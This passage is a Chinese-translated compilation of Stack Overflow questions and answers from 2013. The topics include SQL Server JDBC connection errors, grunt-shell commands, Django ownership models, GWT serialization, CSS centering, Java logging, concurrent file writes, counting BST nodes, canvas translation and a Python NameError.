每 6 小时通过 cron 作业将新数据添加到数据库中。我想用这些数据自动生成静态页面。现在我有动态页面，即 www.mysite.com/story?id=1

真的，我想要一个可以在 www.mysite.com/title-of-story 访问的静态页面

我环顾四周，但真的找不到办法做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T16:39:33.357

奥斯汀，当您说“静态页面”时，您的问题有点含糊。您将这些称为“故事”，这使我相信它们是博客文章而不是页面。那么，您是否希望用户访问您的 WP 网站上的一个 URL，然后显示所有这些故事的列表？或者您是否希望用户访问您的 wordpress 网站并从非 WP MySQL 表中查看您的故事的 blogroll？

如果是后者，您可以考虑使用精确转换和加载脚本 (ETL)，它从上面的 MySQL 表中获取数据并将其移动到 wp_posts 表中。

# java - SQL Server jdbc 连接

> ID：16122547
> 
> 赞同：4
> 
> 时间：2013-04-20T16:23:39.367
> 
> 标签：java, sql-server-2005, jdbc

我在 Windows 身份验证中在 localhost 上运行此代码片段，但出现以下错误，但我已经在我的类路径中添加了 sqljdbc4 jar，并且在从 Eclipse 运行时，我还在构建路径中添加了 jar

```
import java.io.*;
import java.sql.*;
import java.util.GregorianCalendar;
import java.util.Date;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;

class  Cms_truncate
{
    public static void main(String[] args) 
    {
         Calendar cal = new GregorianCalendar();

         //String name="cmscim";
                 Connection conn = null;

         String url = "jdbc:sqlserver://localhost\SQLEXPRESS;databasename=yatin";
         String driver = "com.microsoft.sqlserver.jdbc.SQLServerDriver";
         String userName = ""; 
         String password = "";
         Statement stmt;
         try
         {

         Class.forName(driver);//.newInstance();
         conn = DriverManager.getConnection(url,userName,password);
         String query = "truncate table cim";
         stmt = conn.createStatement();
         int flag = stmt.executeUpdate(query);
         System.out.println("flag = "+flag); 
         conn.close();
        System.out.println("");
         } catch (Exception e) {
         e.printStackTrace();
         }

    }
} 
```

错误：

```
com.microsoft.sqlserver.jdbc.SQLServerException: The TCP/IP connection to the host localhost, port 1433 has failed. Error: "Connection refused: connect. Verify the connection properties. Make sure that an instance of SQL Server is running on the host and accepting TCP/IP connections at the port. Make sure that TCP connections to the port are not blocked by a firewall.".
    at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDriverError(SQLServerException.java:190)
    at com.microsoft.sqlserver.jdbc.SQLServerException.ConvertConnectExceptionToSQLServerException(SQLServerException.java:241)
    at com.microsoft.sqlserver.jdbc.SocketFinder.findSocket(IOBuffer.java:2243)
    at com.microsoft.sqlserver.jdbc.TDSChannel.open(IOBuffer.java:491)
    at com.microsoft.sqlserver.jdbc.SQLServerConnection.connectHelper(SQLServerConnection.java:1309)
    at com.microsoft.sqlserver.jdbc.SQLServerConnection.login(SQLServerConnection.java:991)
    at com.microsoft.sqlserver.jdbc.SQLServerConnection.connect(SQLServerConnection.java:827)
    at com.microsoft.sqlserver.jdbc.SQLServerDriver.connect(SQLServerDriver.java:1012)
    at java.sql.DriverManager.getConnection(Unknown Source)
    at java.sql.DriverManager.getConnection(Unknown Source)
    at Cms_truncate.main(Cms_truncate.java:28) 
```

请帮帮我。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-20T16:26:20.613

此错误不是“身份验证错误”，而是由于“连接被拒绝”而导致的“连接错误”。这意味着您需要指定正确的端口号。您需要检查 SQL Server 配置并更新连接字符串。

根据[MSDN docs](http://msdn.microsoft.com/en-us/library/aa342339.aspx)，连接字符串应如下所示：

```
jdbc:sqlserver://localhost:<insert_proper_port_here>\SQLEXPRESS;databasename=yatin 
```

您没有提供用户名或密码，一旦您弄清楚端口号，您可能需要这样做。有关详细信息，请参阅参考文档。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-10-23T14:11:49.517

我认为是配置问题。

```
Go to Run -> SQL Server Configuration Manger

Expand -> SQL Server *version_no* Network Configuration

Then click on - "Protocol for SQLEXPRESS" 
```

如果您找到`TCP/IP`带有状态的协议，`Disabled`那么您需要`enable`它。

另外，你需要重启服务：打开cmd>输入Services，然后向下滚动到SQL Server(MSSQLServer)，然后重启服务

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2016-06-22T20:21:14.803

首先，当您在 URL 中使用 SQL 实例名称时，您必须指定 `//[serverName[\\instanceName][:portNumber]]databaseName`

例如：`jdbc:sqlserver://localhost\\SQLEXPRESS:1433;databasename=yatin`

一旦完成下一步：-

1.  转到所有程序-> 搜索 SQL Server 配置管理器。打开它
2.  在左侧窗格中展开 SQL Server 网络配置
3.  单击实例名称的协议在大多数情况下，它将是 SQLEXPRESS 的协议
4.  单击 TCP IP。TCP IP 属性窗口将打开
5.  选择启用的属性并将所有属性侦听为“YES”
6.  导航到 IP 地址选项卡并检查 ip all section TC Dynamic port 是否为 1433，如果不是，则设置它
7.  然后申请并确定

8.  现在转到左窗格中 SQL Server 配置管理器下的 SQL Server 服务部分。点击它

9.  在大多数情况下，您将看到数据库引擎正在运行一个实例名称为 SQLEXPRESS 的数据库引擎，右键单击它并停止它，然后重新启动它。

现在重新运行代码

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-01-27T08:35:18.970

您忘记提及实例名称。请参阅[构建连接 URL](http://msdn.microsoft.com/en-us/library/ms378428.aspx)解释如何在 sqlserver 中使用连接 URL

如果您没有提及完整的服务器名称，那么您会收到类似的错误

```
com.microsoft.sqlserver.jdbc.SQLServerException: The TCP/IP connection to the host localhost , port 1433 has failed. Error: "Connection refused: connect. Verify the connection properties. Make sure that an instance of SQL Server is running on the host and accepting TCP/IP connections at the port. Make sure that TCP connections to the port are not blocked by a firewall.". 
```

我的**服务器名称**是`V_UDAY\FRAMEWORK,`我在（在 Java 代码中）删除`FRAMEWORK`实例`URL`并执行，然后出现如下错误。

```
com.microsoft.sqlserver.jdbc.SQLServerException: The TCP/IP connection to the host V_UDAY, port 1433 has failed. Error: "Connection refused: connect. Verify the connection properties. Make sure that an instance of SQL Server is running on the host and accepting TCP/IP connections at the port. Make sure that TCP connections to the port are not blocked by a firewall.".
at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDriverError(SQLServerException.java:190)
at com.microsoft.sqlserver.jdbc.SQLServerException.ConvertConnectExceptionToSQLServerException(SQLServerException.java:241)
at com.microsoft.sqlserver.jdbc.SocketFinder.findSocket(IOBuffer.java:2243)
at com.microsoft.sqlserver.jdbc.TDSChannel.open(IOBuffer.java:491)
at com.microsoft.sqlserver.jdbc.SQLServerConnection.connectHelper(SQLServerConnection.java:1309)
at com.microsoft.sqlserver.jdbc.SQLServerConnection.login(SQLServerConnection.java:991)
at com.microsoft.sqlserver.jdbc.SQLServerConnection.connect(SQLServerConnection.java:827)
at com.microsoft.sqlserver.jdbc.SQLServerDriver.connect(SQLServerDriver.java:1012)
at java.sql.DriverManager.getConnection(DriverManager.java:571)
at java.sql.DriverManager.getConnection(DriverManager.java:215)
at com.testsql.SqlServerDatabaseConnectionUsingJava.getLocalConnection(SqlServerDatabaseConnectionUsingJava.java:28)
at com.testsql.SqlServerDatabaseConnectionUsingJava.main(SqlServerDatabaseConnectionUsingJava.java:18)
Exception in getLocalConeection() The TCP/IP connection to the host V_UDAY, port 1433 has failed. Error: "Connection refused: connect. Verify the connection properties. Make sure that an instance of SQL Server is running on the host and accepting TCP/IP connections at the port. Make sure that TCP connections to the port are not blocked by a firewall.". 
```

下图显示了您的**服务器名称**，并带有`slash`分隔符

![SQLSERVER_LoginPage](https://i.stack.imgur.com/3NEaE.png)

执行以下 Java 程序需要 sqljdbc4。下载[sqljdbc4](https://app.box.com/s/i3p9c30eioqdhai7cs35) jar 或从[Microsoft JDBC Driver 4.0 for SQL Server](http://www.microsoft.com/en-us/download/details.aspx?displaylang=en&id=11774)下载。

使用 Java 连接到 sqlserver 的示例。这`JSF`是数据库名称。

```
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class SqlServerDatabaseConnectionUsingJava {
    private static Connection connection = null;
    //1.jdbc driver name
    private static String SQL_JDBC_DRIVER = "com.microsoft.sqlserver.jdbc.SQLServerDriver";
    // 2\. Database URL, V_UDAY\FRAMEWORK is ServerName and JSF is DataBase name
    private static String URL = "jdbc:sqlserver://V_UDAY;instanceName=FRAMEWORK;databaseName=JSF";
    //3.Database credentials
    private static String USERNAME = "udaykiran";//UserName
    private static String PASSWORD = "Pa55word";//Password

public static void main(String[] args) {
    getLocalConnection();
}

public static Connection getLocalConnection() {
    try {
        Class.forName(SQL_JDBC_DRIVER);// Register jdbc driver

        System.out.println("****Connect to Database****");

        //4\. open a connection
        connection = DriverManager.getConnection(URL, USERNAME, PASSWORD);

        System.out.println("DataBase connect to: "+ connection.getMetaData().getDriverName());
        System.out.println("URL: "+ connection.getMetaData().getURL());

        setConnectionClose();
        System.out.println("Database Connection Closed");
    } catch (Exception e) {
        e.printStackTrace();
        System.err.println("Exception in getLocalConeection() "+e.getMessage());
    }
    return connection;
}

public static void setConnectionClose() throws SQLException {
    if (connection != null) {
        connection.close();
    }
}

} 
```

**注意：**如果您有其他删除实例名称`FRAMEWORK`，请提及实例名称。`url`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-06-19T17:15:23.077

根据微软文档

```
String url = "jdbc:sqlserver://localhost\SQLEXPRESS:[your_port_tcp];databasename=yatin"; 
```

[https://msdn.microsoft.com/pt-br/library/ms378428(v=sql.110).aspx](https://msdn.microsoft.com/pt-br/library/ms378428(v=sql.110).aspx)

# node.js - 如何在 gruntjs 任务中运行多个 shell 命令？

> ID：16122549
> 
> 赞同：11
> 
> 时间：2013-04-20T16:23:59.293
> 
> 标签：node.js, gruntjs

我目前使用[grunt-shell](https://github.com/sindresorhus/grunt-shell)从[grunt](http://gruntjs.com)任务运行 shell 命令。除了用'&&'将它们串在一起之外，有没有更好的方法在一个任务中运行多个命令？

我的 Gruntfile（部分）：

```
grunt.initConfig({
  shell: {
    deploy: {
      options: { stdout: true },
      command: 'mkdir -p static/styles && cp public/styles/main.css static/styles'
    }
  }
}); 
```

一系列命令**不起作用**，但它会很好：

```
grunt.initConfig({
  shell: {
    deploy: {
      options: { stdout: true },
      command: [
        'mkdir -p static/styles',
        'cp public/styles/main.css static/styles'
      ]
    }
  }
}); 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-04-20T23:15:08.770

您可以将它们连接在一起：

```
grunt.initConfig({
  shell: {
    deploy: {
      options: { stdout: true },
      command: [
        'mkdir -p static/styles',
        'cp public/styles/main.css static/styles'
      ].join('&&')
    }
  }
}); 
```

我选择不支持数组的原因是有些人可能想要`;`作为分隔符而不是`&&`，这使得执行上述操作更容易。

# django - django用户异或组模型关系

> ID：16122557
> 
> 赞同：1
> 
> 时间：2013-04-20T16:24:44.260
> 
> 标签：django, properties, django-models, django-contenttypes

我正在考虑与 django 的内置`User`或`Group`.

我所说的“或”是指模型实例必须由`User`a 或 a独占拥有`Group`。

我认为通过查看我上面的模型应该很容易理解这个问题。

这是我目前的实现。我一直在研究[GenericRelations](https://docs.djangoproject.com/en/dev/ref/contrib/contenttypes/#id1)，但是当仅限于这么少的模型时，它们并不合适。

**编辑**：用抽象模型重构。

```
class OwnedModel(models.Model):

    _owner_user = models.ForeignKey(User, null=True, related_name='%(class)s')

    _owner_group = models.ForeignKey(Group, null=True, related_name='%(class)s')

    class Meta:
        abstract = True

    @property 
    def owner(self):
        return self._owner_user or self._owner_group

    @owner.setter
    def owner(self, value):
        if isinstance(value, User):
            self._owner_user = value
            if self._owner_group:
                self._owner_group = None
        elif isinstance(value, Group):
            self._owner_group = value
            if self._owner_user:
                self._owner_user = None
        else:
            raise ValueError

class RemoteAccess(OwnedModel):
    SSH = 's'
    SUPPORTED_PROTOCOLS = (
        (SSH, "ssh"),
    )

    host = models.CharField(_('host name'), max_length=255, validators=[full_domain_validator])

    protocol = models.CharField(_('protocol'), max_length=1, choices=SUPPORTED_PROTOCOLS, default=SSH)

    credential = models.OneToOneField(RemoteCredential) 
```

我当前实施的主要问题是：

*   创建实例时如何强制它设置`User`或？`Group`覆盖可能`__init__`是要走的路吗？
*   是否有更好/更清洁/更高效的实施？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T20:32:10.877

我会改写 save() 方法并定义一个自定义异常

```
def save(self, *args, **kwargs):
    if self._owner_user is None and self._owner_group is None:
        raise NoOwner
    super(OwnedModel, self).save(*args, **kwargs) 
```

在某些情况下，在保存之前您实际上没有所有者（例如在表单等中），覆盖**init可能会导致问题**

我认为没有更清洁的方法可以做到这一点并坚持使用 Django 用户/组。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-21T00:38:14.770

根据您的程序，有几种选择如何实现这一点。一种方法是使用继承。

```
class Owner(models.Model):

     def create(self,instance):
         raise NotImplementedError('Method create should be called from subclasses of owner')

class UserOnwer(Owner):
      user = models.ForeignKey(User)
      def create(self,instance):
          self.user = instance

class GroupOnwer(Owner):
      group = modelsForeignKey(Group)
      def create(self,instance):
          self.group = instance

class RemoteAccess(models):
      ....
      owner = models.ForeignKey(Owner)

      def get_onwer():  # shortcut implementation of this method must go to Owner.Manager 
          try:
             return UserOnwner.objects.get(pk = self.owner_id) # or what is more common case
          except UserOnwner.DoesNotExist:
             return GroupOnwer.objects.get(pk = self.owner_id) 
```

我需要说几句关于权衡你在这里支付的费用。在这种情况下，最多有两个查询可以获取 GroupOwner，并且您将遇到列表问题。为了解决一些问题，您需要向所有者提供一些关于他的孩子的额外知识（以第三范式和封装原则为代价）。

```
class Owner(models.Model):
     owner_type = models.CharField(choices('user','group')) 

     @classmethod # factory here
     def create(cls,instance):
         if is_instance(instance,User):
             user_owner = UserOnwer()
             return user_owner.user = instance
         if is_instance(instance,User):
             group_owner = GroupOwner()
             return group_owner.group = instance

class UserOnwer(Owner):
     user = models.ForeignKey(User)

class GroupOnwer(Owner):
      group = modelsForeignKey(Group)

class RemoteAccess(models):
      ....
      owner = models.ForeignKey(Owner)

      def get_onwer():  # shortcut implementation of this method must go to Owner.Manager 
          if self.owner.owner_type == 'user':
             return UserOnwner.objects.get(pk = self.owner_id)
          elif self.owner.owner_type == 'group':
             return GroupOnwer.objects.get(pk = self.owner_id) 
```

好的，这在某些情况下是合适的，但在某些情况下却不是。还有额外的查询，为了避免它我们可以分开存储级别和行为级别。

```
 class Owner(models.Model):
     owner_type = models.CharField(choices('user','group')) 
     user = models.ForeignKey(User,null=True,blank=True)
     group = models.ForeignKey(Group,null=True,blank=True)

     @classmethod
     def create(cls,instance):
         owner = Owner()
         owner.set_owner(instance)

     def set_owner(self,instance):
         if is_instance(instance,User):
            self.owner_type = 'user'
         elif is_instance(instance,Group):
            self.owner_type = 'group'
        self.post_init()
        self.owner_behavior.set_instance(instance) 

    def post_init(self): #factory is moved here
        self.owner_behavior = AbstarctOwnerBehavior()
        if self.owner_type == 'user':
            self.owner_behavior = UserOnwerBehaviour(self)
        elif self.owner_type == 'group':
            self.owner_behavior = GroupOnwerBehaviour(self)

     def get_owner(self):
         return self.owner_behaviour.get_owner()

    def title(self):
        self.owner_behavior.printed_title()

class AbstarctOwnerBehavior(object):

    def __init__(self,owner_instance):
        self.owner_instance = owner_instance

    def set_instance(self, instance):
        raise NotImplementedError()

    def get_instance(self):
        raise NotImplementedError()

    def printed_title(self):
        raise NotImplementedError()

class UserOnwerBehaviour(OwnerBehaviour):

    def get_instance(self):
        return self.owner_instance.user

    def set_instance(self, instance):
        self.owner_instance.user = instance

    def printed_title(self):
        return self.owner_instance.user.username # note here

class GroupOnwerBehaviour(OwnerBehaviour):

    def get_instance(self):
        return self.owner_instance.group

    def set_instance(self, instance):
        self.owner_instance.group = group

    def printed_title(self):
        return self.owner_instance.group.name # and here

 #  and finally a sinal if you are afraid of overwriting __init__
from django.db.models.signals import post_init
from models import Owner

def owner_post_init_handler(sender, instance, **kwargs):
    instance.post_init()

post_save.connect(owner_post_init_handler, sender=Owner) 
```

哟可能会美化一点，但我认为这段代码足以理解这个想法。这个解决方案也有它的缺点，你需要绕过从 Owner 模型到行为的调用（这可能是快捷方式）并且你丢失了 3nf 形式的数据库结构。从应用程序的其他部分，您需要避免直接调用 User 和 Group 模型（在所有权上下文中），并使用抽象层，这有时可能会导致 AbstarctOwnerBehavior 接口增长，从设计的角度来看，我们最好保持接口小. 如果未发送 post_init 信号，您也会遇到问题。但是如果你使用抽象层——你会获得利润，不需要的 if-else 案例被删除，这会简化代码，使其更健壮，如果设计得当，这种行为很容易测试（因为它们没有额外的 if-else 路径) 和可扩展的。

因此，没有适合所有情况的“最佳”解决方案，这取决于您的工程判断。

# gwt - 尝试在枚举中添加 IsSerializable 时出现 gwt 错误

> ID：16122564
> 
> 赞同：0
> 
> 时间：2013-04-20T16:25:23.057
> 
> 标签：gwt, gwt-rpc

您好，我尝试序列化我的枚举类，但是当我尝试编译我的项目时出现错误。

这是我的简单枚举：

```
import com.google.gwt.user.client.rpc.IsSerializable;

public enum ConversationType implements IsSerializable {

    PAIR, GROUP, ALL;

    ConversationType() {

    }

} 
```

我的 pom 依赖项中也有 gwt-user：

```
<dependency>
      <groupId>com.google.gwt</groupId>
      <artifactId>gwt-user</artifactId>
      <version>2.5.0</version>
      <scope>provided</scope>
    </dependency> 
```

在那个项目中，我有其他 DTO 对象，并且该对象实现 IsSerializable。当我从该枚举中删除 IsSerializable 时，一切都很好。

这是我的错误：

```
An exception has occurred in the compiler (1.7.0_13). Please file a bug at the Java Developer Connection (http://java.sun.com/webapps/bugreport)  after checking the Bug Parade for duplicates. Include your program and the following diagnostic in your report.  Thank you.
com.sun.tools.javac.code.Symbol$CompletionFailure: class file for com.google.gwt.user.client.rpc.IsSerializable not found 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T16:38:35.673

`IsSerializable`所有枚举都可以通过 GWT-RPC 序列化，那么如果这会触发中的错误，您为什么要尝试实现它`javac`呢？

参考：[https ://developers.google.com/web-toolkit/doc/latest/DevGuideServerCommunication#DevGuideSerializableTypes](https://developers.google.com/web-toolkit/doc/latest/DevGuideServerCommunication#DevGuideSerializableTypes)

# html - div 中的居中图标和文本

> ID：16122573
> 
> 赞同：1
> 
> 时间：2013-04-20T16:26:18.903
> 
> 标签：html, css, icons

我正在玩一个教程，我发现一个图标显示在列表中的某些文本旁边。（[http://praveenfrancis.com/tutorials/create-a-simple-menu-with-css-sprite/](http://praveenfrancis.com/tutorials/create-a-simple-menu-with-css-sprite/)）

我想要做的是尝试使图标和文本居中，`<li>`这样当菜单变得流畅并调整大小时，文本和图标仍保留在元素的中心。

我创建了一个 jsfiddle 并尝试这样做，但我似乎无法完全正确。谁能给我一些指示？

[http://jsfiddle.net/PuZwb/](http://jsfiddle.net/PuZwb/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T16:35:07.777

要按照自己的方式进行操作，您必须在`<li>`. 请参阅此[更新的小提琴](http://jsfiddle.net/PuZwb/3/)以了解我的意思。

这也是使用`:before`伪选择器的好地方。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T16:44:54.677

将你的 ul 包裹在一个 div 中，比如

```
body>
<div class="wrapper">
    <ul class="menu">
        <li id="cakes">cakes</li>
        <li id="donuts">donuts</li>
        <li id="rolls">rolls</li>
        <li id="pies">pies</li>
    </ul>
</div> 
```

然后像这样的CSS

```
.menu {
width: 210px;
background-color: #09C; 
margin 0 auto;

}

.wrapper {
    width: 100%;
    background-color: #09C; 
```

这将使您的 ul 居中，既美观又简单

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-20T16:34:55.403

这是解决方案：http: [//jsfiddle.net/PuZwb/2/](http://jsfiddle.net/PuZwb/2/)。您需要将精灵包含在一个元素或一个伪选择器中，例如`:before`然后使用`display: inline-block`and then `vertical-align: middle`。

# CSS

```
ul.menu li:before{
    content: '';
    display: inline-block;
    width: 64px;
    height: 64px;
    margin-right: 10px;
    vertical-align: middle;
    background:url("http://chrisandjennyswedding.com/sprite.png") no-repeat;
}

ul.menu li#cakes:before   {background-position:0 0}
ul.menu li#donuts:before  {background-position:0 -64px}
ul.menu li#rolls:before   {background-position:0 -128px}
ul.menu li#pies:before {background-position:0 -196px} 
```

# java - Java 日志格式化程序已重置

> ID：16122578
> 
> 赞同：0
> 
> 时间：2013-04-20T16:26:30.410
> 
> 标签：java, mysql, logging

我像这样初始化记录器：

```
public static void init() {
   ConsoleHandler handler = new ConsoleHandler();
   handler.setFormatter(new LogFormatter());
   Logger.getLogger(TrackerConfig.LOGGER_NAME).setUseParentHandlers(false);
   Logger.getLogger(TrackerConfig.LOGGER_NAME).addHandler(handler);
} 
```

LogFormatter 的格式化函数：

```
@Override
public String format(LogRecord record) {
   StringBuilder sb = new StringBuilder();

   sb.append(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss Z").format(new Date(record.getMillis())))
   .append(" ")
   .append(record.getLevel().getLocalizedName()).append(": ")
   .append(formatMessage(record)).append(LINE_SEPARATOR);

   return sb.toString();
} 
```

要使用日志，我使用以下方法：

```
private static void log(Level level, String message) {
   Logger.getLogger(TrackerConfig.LOGGER_NAME).log(level, message);
   if (level.intValue() >= TrackerConfig.DB_LOGGER_LEVEL.intValue()) {
      DBLog.getInstance().log(level, message);
   }
} 
```

DBLog.log 方法：

```
public void log(Level level, String message) {
   try {
      this.logBatch.setTimestamp(1, new Timestamp(Calendar.getInstance().getTime().getTime()));
      this.logBatch.setString(2, level.getName());
      this.logBatch.setString(3, message);
      this.logBatch.addBatch();
   } catch (SQLException ex) {
      Log.logError("SQL error: " + ex.getMessage()); // if this happens the code will exit anyways so it will not cause a loop
   }
} 
```

现在正常的 Log 输出如下所示：

> 2013-04-20 18:00:59 +0200 信息：启动跟踪器

它工作了一段时间，但无论出于何种原因，LogFormatter 似乎都被重置了。

有时只有一个日志条目正确显示，之后日志条目显示如下：

> 2013 年 4 月 20 日下午 6:01:01 package.util.Log 日志信息：
> 
> 加载了 33266 个数据库条目。

再次。

我尝试了什么：

出于调试目的，我添加了一个线程，该线程每 x 秒输出一次 jvm 的内存使用情况。输出使用正确的日志格式，直到保留内存值更改（可用内存值更改未重置日志格式），如下所示：

> 2013-04-20 18:16:24 +0200 警告：内存使用量：23 / 74 / 227 MiB
> 
> 2013-04-20 18:16:25 +0200 警告：内存使用量：20 / 74 / 227 MiB
> 
> 2013-04-20 18:16:26 +0200 警告：内存使用量：18 / 74 / 227 MiB
> 
> 2013 年 4 月 20 日下午 6:16:27 package.util.Log 日志警告：
> 
> 内存使用量：69 / 96 / 227 MiB
> 
> 2013 年 4 月 20 日下午 6:16:27 package.util.Log 日志信息：
> 
> 调度程序运行
> 
> 2013 年 4 月 20 日下午 6:16:27 包。日志日志警告：
> 
> 内存使用量：67 / 96 / 227 MiB

另请注意，日志级别似乎从此处的警告重置为信息。

问题似乎出在哪里：

当我像这样注释掉数据库日志功能时：

```
private static void log(Level level, String message) {
   Logger.getLogger(TrackerConfig.LOGGER_NAME).log(level, message);
   if (level.intValue() >= TrackerConfig.DB_LOGGER_LEVEL.intValue()) {
      // DBLog.getInstance().log(level, message);
   }
} 
```

日志格式正确。

任何想法 DBLog 的日志功能可能有什么问题或为什么日志突然重置？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-09T00:50:44.923

我不会真正称其为解决方案，但它现在有效。原因似乎是内存计算本身。即使我只是计算它而不记录它，日志格式也会被重置。当我刚刚注释掉 DBLog 的使用时，我不知道为什么它会起作用。

```
int mb = 1024 * 1024;
long freeMemory = Runtime.getRuntime().freeMemory() / mb;
long reservedMemory = Runtime.getRuntime().totalMemory() / mb;
long maxMemory = Runtime.getRuntime().maxMemory() / mb;
String memoryUsage = "Memory usage: " + freeMemory + " / " + reservedMemory + " / " + maxMemory + " MiB"; 
```

这是我使用的代码。一旦我将其注释掉，日志格式就不再重置，现在一切都按预期工作。

# c++ - 同时更新文件而不锁定文件

> ID：16122581
> 
> 赞同：0
> 
> 时间：2013-04-20T16:26:50.087
> 
> 标签：c++, c, perl

问题 - 多个进程想要同时更新一个文件。我不想将文件锁定功能用作高负载环境，一个进程可能会阻塞一段时间，这是我不想要的。我想要像所有进程将数据发送到队列或某个共享位置或其他东西，一个主进程将继续从那里获取数据并写入文件。所以没有进程会被阻塞。

使用套接字编程的一种可能性。所有进程都会将数据发送到单个端口，并且主进程继续侦听这个单个端口并将数据存储到文件中。但是如果主进程停机几秒钟怎么办。如果发生这种情况，我可能会写入某个文件基于时间戳，然后再同步。但我将其搁置并寻找其他解决方案。（没有数据丢失）

另一种可能性可能是锁定进程要写入的文件的特定段。基本上每个进程都会写一行。我不确定它对于高负载系统会有多好。

请为此问题提出一些解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:32:50.027

让一个[0mq](http://www.zeromq.org/)实例处理写入（正如您最初为套接字提议的那样）并让工作人员连接到它并将他们的写入添加到队列中（许多语言的[示例](http://zguide.zeromq.org/page%3aall#Divide-and-Conquer)）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T18:00:18.050

每个进程都可以写入自己的文件 (pid.temp) 并定期重命名文件 (pid-0.data, pid-1.data, ...) 以获取可以获取所有这些文件的主进程。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T19:37:32.310

您可能不需要构建这样的东西。如果您不想阻止进程，只需使用`LOCK_NB`perl [flock](http://perldoc.perl.org/functions/flock.html)的标志。定期尝试`flock`。如果不成功，则继续处理，值可以存储在数组中。如果文件被锁定，则从数组中写入数据。

# c++ - BST - 查找元素的数量

> ID：16122582
> 
> 赞同：0
> 
> 时间：2013-04-20T16:26:58.523
> 
> 标签：c++

有没有办法找到二叉搜索树中元素的数量？

```
struct node
{
    node *p, *left, *right;
    int key;
}; 
```

这是我节点的结构，p 指针指向父元素。

我需要找到该数字来分配内存以搜索树并返回包含所有元素的数组。

我想出了这样的事情：

```
int numberOfElements(node *root, int count = 0)
{
    if(root)
    {
        numberOfElements(root->left, ++count);
        numberOfElements(root->right, ++count);
    }
    return count + 1;
} 
```

但是，它显示了一些随机结果：P 对于“1、2”显示 2，对于“1、2、3、4、5、6、7”，它显示 3 等等...

我想在一个函数中执行此操作，这就是为什么 count 是这里的一个参数。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T16:33:37.573

您似乎根本没有使用的返回值`numberOfElements`。此版本可能有效：

```
int numberOfElements(node *root)
{
    if(root)
    {
        return numberOfElements(root->left) + 
               numberOfElements(root->right) + 1;
    }
    return 0;
} 
```

通常，这种树的大小应该记录在一个字段中，并且每次修改树时都会更新。没有人期望 O(N) 运行时间只是为了找到一棵树的大小。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-20T16:32:14.630

您不需要第二个参数：

```
int numberOfElements(node *root) {
    if (root) {
        return 1 + numberOfElements(root->left) + numberOfElements(root->right);
    } else {
        return 0;
    }
} 
```

# javascript - 如何有选择地将一个函数中的所有画布动作转移到另一个函数

> ID：16122585
> 
> 赞同：2
> 
> 时间：2013-04-20T16:27:02.040
> 
> 标签：javascript, canvas, html5-canvas

**考虑以下示例。**

```
var ctx = document.createElement('canvas').getContext('2d');
function draw(){
    ctx.fillRect(10,10,10,10);
};
function render(){
    var coordinates = {x:100,y:200};
    draw();
}; 
```

**问题**

这将足够简单地从画布的顶部和左侧绘制一个 10 像素的黑色矩形。但是，我如何指示程序将函数中绘制的所有内容`draw`按 中的值移动`coordinates`？

**我目前的想法以及它们为什么行不通**

1.  通过保存和恢复上下文来使用翻译方法。这是不可靠的，因为绘图功能可能还包括保存和恢复，它们会发生冲突。
2.  `draw`在单独的画布上绘制函数中的所有内容，然后使用`drawImage`所需的翻译将该画布绘制到所需的画布上。示例：`draImage(canvas,coordinates.x,coordinates.y);`。这失败了，因为该`draw`函数是在与 相同的范围内创建的`ctx`，即使`ctx`在其中重新定义`render`它仍将使用原始`ctx`.
3.  将函数转换为字符串并使用正则表达式来移动所有绘图值......非常不切实际。
4.  使用像素操作......这也会将东西移到绘图函数之外，因此必须丢弃它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:32:49.413

尝试您最初的多次保存/恢复想法。

画布状态通过每个 context.save() 推送到堆栈上，并通过每个 context.restore() 弹出。

因此，您应该没有问题“嵌套”保存/恢复。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:31:55.590

您可以在函数范围之外创建变量

```
var coordinates;

var ctx = document.createElement('canvas').getContext('2d');
function draw(){
//use the values
    ctx.fillRect(coordinates.x,coordinates.y,10,10);
};
function render(){
//set the values
    coordinates = {x:100,y:200};
    draw();
}; 
```

# python - 为什么我的函数没有定义？

> ID：16122594
> 
> 赞同：0
> 
> 时间：2013-04-20T16:27:42.723
> 
> 标签：python, list, filter

我不明白为什么python找不到我的函数。

我创建一个函数共享：

```
def share(item):
    if re.findall(r'\bshare',item):                                                               
        return True                                                                               
    return False 
```

我只想用它来过滤列表

```
item['twurlshort'] = filter(lambda item: not share, item['twurlshort']) 
```

但是蟒蛇说：`exceptions.NameError: global name 'share' is not defined`

我的过滤器功能在同一类。任何人都知道为什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T16:30:08.950

Python 不会对此撒谎，因此您的函数不在范围内。

请检查您的功能是

1.  在顶级范围内，
2.  或者如果不是，在与调用者相同的范围内，
3.  或者如果它在另一个模块中，您已经导入了该模块，
4.  或者如果在同一个类中，你称它为附加到一个实例

在您的情况下，您需要更改两件事：

```
Class Whatever:
    def share(self, item):
        # ...

item['twurlshort'] = filter(lambda item: not item.share, item['twurlshort']) 
```

# bison - 野牛减少/减少冲突

> ID：16122595
> 
> 赞同：0
> 
> 时间：2013-04-20T16:27:44.293
> 
